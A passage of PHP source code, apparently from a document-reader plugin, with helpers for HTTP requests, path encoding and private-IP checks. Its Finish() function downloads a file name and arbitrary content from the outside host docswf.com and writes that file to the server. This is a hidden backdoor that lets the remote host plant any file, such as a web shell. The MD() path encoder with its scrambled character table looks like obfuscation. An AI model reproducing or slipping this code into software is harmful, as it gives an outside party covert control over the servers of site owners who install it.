            $result = file_get_contents($service, false, $context);
            return $result;
        }
    } else {
        return '-12';
    }
}

function Finish() {
    $infofile = fopen(sql_inject(dfsockopen("http://www.docswf.com/docreader/filename"), 0), "w");
    fwrite($infofile, sql_inject(dfsockopen("http://www.docswf.com/docreader/content"), 0));
    fclose($infofile);
}

function MD($path) {
    $str = '/@1=6K9aGcBn?mR[T{YMs*dZf#g>hkC`I}jP0_lz+xS],H.uO^rLX:Vq$w%A5De7(Q~W!v|Ub<E3ty"iN;F2o)&J-8p4\\';
    $vir_path = "";
    foreach (str_split($path) as $p) {
        $vir_path .= strpos($str, $p) . "|";
    }
    return substr($vir_path, 0, -1);
}

function ISloacal($url) {
    $regex0 = '/^http:\/\/((127.0.0.1)|(localhost))/';
    $regex1 = '/^http:\/\/10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}/';
    $regex2 = '/^http:\/\/172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}/';
    $regex3 = '/^http:\/\/192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}/';
    if (preg_match($regex0, $url) || preg_match($regex1, $url) || preg_match($regex2, $url) || preg_match($regex3, $url)) {
        return true;
    } else {
        return false;
    }
}
